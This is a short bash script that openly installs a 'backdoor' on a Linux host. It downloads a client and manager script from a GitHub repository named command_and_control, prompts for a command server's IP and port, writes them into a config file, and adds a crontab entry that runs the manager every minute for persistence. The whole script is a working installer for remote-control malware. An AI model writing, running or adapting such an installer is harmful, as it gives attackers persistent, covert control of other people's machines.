#!/bin/bash
echo "Installing dependencies..."
echo "Installing python3"
yum install -y -q python3
echo "Downloading backdoor..."
curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /home/user/client.py
curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /home/user/manager.sh
echo "Configure backdoor"
read -p "Enter server ip: " server_ip
read -p "Enter server port: " server_port
rm -f /home/user/conf.py
echo "SERVER_IP = '$server_ip'\n" >> /home/user/conf.py
echo "SERVER_PORT = $server_port\n" >> /home/user/conf.py
chmod +x /home/user/manager.sh
(crontab -l 2>/dev/null; echo "* * * * * /home/user/manager.sh") | crontab -
echo "Installation complete"